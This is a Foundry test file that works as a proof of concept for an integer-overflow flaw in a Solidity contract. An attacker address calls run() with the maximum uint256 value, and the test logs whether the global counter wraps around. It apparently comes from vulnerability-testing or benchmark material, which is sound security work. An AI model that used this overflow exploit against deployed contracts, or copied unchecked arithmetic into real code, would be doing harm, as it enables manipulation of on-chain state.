// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_add.sol";

contract IntegerOverflowAddTest is Test {
    IntegerOverflowAdd public overflowContract;
    address public attacker = address(0x1337);

    function setUp() public {
        overflowContract = new IntegerOverflowAdd();
    }

    function testIntegerOverflow() public {
        // Initial user operation count should be 0
        assertEq(overflowContract.getUserOperationCount(attacker), 0);

        // Attacker performs normal operation
        vm.prank(attacker);
        overflowContract.run(100);
        
        // Verify user operation count was incremented
        assertEq(overflowContract.getUserOperationCount(attacker), 1);

        // BEFORE OVERFLOW (State snapshot)
        console2.log("--- BEFORE-Trigger Overflow ---");
        uint256 countBefore = overflowContract.count();
        console2.log("Global count before overflow attack:", countBefore);

        // TRIGGER - Overflow operation
        console2.log("--- Trigger Overflow Operation ---");
        console2.log("Attacker calls run(type(uint256).max)");
        vm.prank(attacker);
        overflowContract.run(type(uint256).max);

        // AFTER OVERFLOW (State snapshot)
        console2.log("--- AFTER-Trigger Overflow ---");
        uint256 countAfter = overflowContract.count();
        console2.log("Global count after overflow attack:", countAfter);

        // Verification - Should be less due to wrap-around
        bool overflowOccurred = countAfter < countBefore;

        // DIAGNOSTIC AND RESULT ANNOUNCEMENT
        console2.log("--- Result Analysis ---");
        console2.log("1) Initial count before attack:", countBefore);
        console2.log("2) Final count after attack: ", countAfter);
        console2.log("3) Count reduced by:         ", countBefore - countAfter);
        console2.log("4) Overflow occurred:        ", overflowOccurred ? "YES" : "NO");

        // Final vulnerability verification
        if (overflowOccurred) {
            console2.log("Vulnerability Exists: Integer Overflow (Count wrapped around due to unchecked addition)");
        } else {
            console2.log("Vulnerability not Exist: No Integer Overflow Detected");
        }
    }
}